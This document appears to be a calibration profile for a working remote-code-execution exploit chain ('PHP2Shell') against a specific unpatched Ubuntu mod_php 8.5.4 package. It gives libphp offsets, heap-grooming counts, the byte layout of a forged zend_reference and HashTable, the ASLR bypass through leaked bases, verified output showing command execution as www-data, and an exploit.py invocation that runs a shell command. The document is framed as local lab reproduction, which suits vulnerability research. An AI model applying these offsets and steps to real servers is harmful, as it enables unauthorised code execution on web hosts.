# PHP 8.5.4 Ubuntu amd64 profile

This profile reproduces the complete PHP2Shell stage-3 chain against:

```text
Ubuntu 26.04
libapache2-mod-php8.5 8.5.4-0ubuntu1.3
Apache prefork, one worker, mod_php
linux/amd64
```

Ubuntu's current `8.5.4-0ubuntu1.5` package includes the security fix. The
lab pins and downloads `8.5.4-0ubuntu1.3` explicitly.

## Verified result

```text
[+] chunk base = 0x7ffffea00000
[+] libphp base = 0x7ffffd200000
[*] stage 3: HTDATA=0x7ffffea7c0d8 ZIF=0x7ffffd5dda90
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Calibration

| Value | Offset / shape |
|---|---|
| `zif_system` | `libphp+0x3dda90` |
| `zval_ptr_dtor` | `libphp+0x5e8dc0` |
| stage-1 fillers | `841` |
| stage-2 target array | `406`, value length `16` |
| stage-3 A pads | `123 × (name=8, value=7)` |
| dangling reference `R0` | `chunk+0x7b020` |
| stage-3 B fillers | `100 × value length 40` |
| fake HashTable | `chunk+0x7c0d8` |

The final `f01` value is an 80-byte-bin allocation whose data starts at
`R0-8`. Its payload writes the complete fake reference internally:

```text
+0x00  8 bytes padding
+0x08  gc: rc=1, type=IS_REFERENCE
+0x10  val.value -> fake HashTable
+0x18  val.type = IS_ARRAY_EX
+0x20  8 bytes padding
```

Building the complete reference avoids a 15-byte carrier problem specific to
this allocator layout: the following allocation could overwrite `val.type`
with a new `zend_string` header (`rc=1`).

## Rosetta and ASLR

On Apple Silicon, Docker Desktop executes this `linux/amd64` image through
Rosetta (`/run/rosetta/rosetta`). PAC and BTI are native ARM64 properties and
do not apply to this amd64 guest.

ASLR is not preventing stage 3. Stages 1 and 2 leak both the Zend MM chunk and
libphp bases, and all stage-3 targets are relative to those leaked bases. The
Rosetta-specific obstacle was dynamic debugging: GDB could not read registers,
and Rosetta cached translated blocks after `/proc/PID/mem` patching.

For calibration we used a temporary `int3` at
`php_session_track_init` and a preload handler that replaces `SIGTRAP` with
`SIGSTOP`, then resumes through a trampoline. The final exploit does not use
GDB, Frida, ptrace, or the diagnostic preload.

## `R0` and the `val.type` clobber

`R0` is the address of the stale `zend_reference` reachable through
`PS(http_session_vars)`. Stage 3 must rewrite that object so its
`val.value` points to the fake HashTable. This is a real requirement on every
amd64 Linux target; it is not created by Rosetta:

```text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))
    zend_reference_destroy(R0)
      val.value -> fake HashTable
```

The initial 15-byte carrier writes:

```text
R0+0x00  gc: rc=1, IS_REFERENCE
R0+0x08  low 7 bytes of fake-HashTable pointer
R0+0x0f  high pointer byte
```

In this Ubuntu 8.5.4 allocator layout, the adjacent allocation starts at
`R0+0x10`. Its `zend_string` header writes `rc=1` over the low 32 bits of
`val.type`:

```text
before: val.type = 0x0000000000000307  (IS_ARRAY_EX)
after:  val.type = 0x0000000016000001  (string-header clobber)
```

That makes `zend_reference_destroy()` interpret the reference value as the
wrong zval type, so the fake HashTable destructor is not reached.

The robust Ubuntu carrier avoids the clobber by using an 80-byte-bin value.
The `f01` data starts at `R0-8` and writes the complete reference inside the
allocation:

```text
R0-0x08  padding
R0+0x00  gc: rc=1, IS_REFERENCE
R0+0x08  val.value -> fake HashTable
R0+0x10  val.type = IS_ARRAY_EX
R0+0x18  u2 / padding
```

The following allocation starts after this 80-byte bin, so it cannot overwrite
`val.type`.

### Native amd64 versus Rosetta

| Topic | Native Ubuntu amd64 | Docker amd64 on Apple Silicon |
|---|---|---|
| PAC / BTI | Not applicable | Not applicable |
| ASLR | Defeated by stage 1/2 leaks | Defeated by stage 1/2 leaks |
| `R0` calibration | Still required | Still required |
| `val.type` adjacency | Allocator-dependent; inspect | Observed and bypassed here |
| GDB registers | Available | Not readable under Rosetta |
| Live `int3` repair via `/proc` | Normally invalidates execution | Rosetta may retain translated block |

Rosetta made the *debugging* harder: GDB could not read guest registers and a
translated block could remain cached after patching `libphp` memory. The
diagnostic workaround was a permanent `int3` plus a preload trampoline.
Rosetta does not remove the need to steer or inspect `R0`.

The present result was verified with `linux/amd64` on Docker Desktop/Rosetta.
A native x86-64 VPS removes the debugger/trampoline complications, but it
should still use the complete-reference carrier unless its allocator geometry
is independently measured. It may permit a simpler calibration; it should not
be assumed to make the 15-byte carrier safe.

## Reproduction

```bash
docker compose -f lab/ubuntu-php85/compose.yml up --build -d

python3 exploit.py \
  -u http://127.0.0.1:18080/index.php \
  --profile ubuntu855 \
  -c 'id>/out/p1' \
  --proof-file out/p1 \
  --offsets-file '' \
  --no-auto-offsets
```
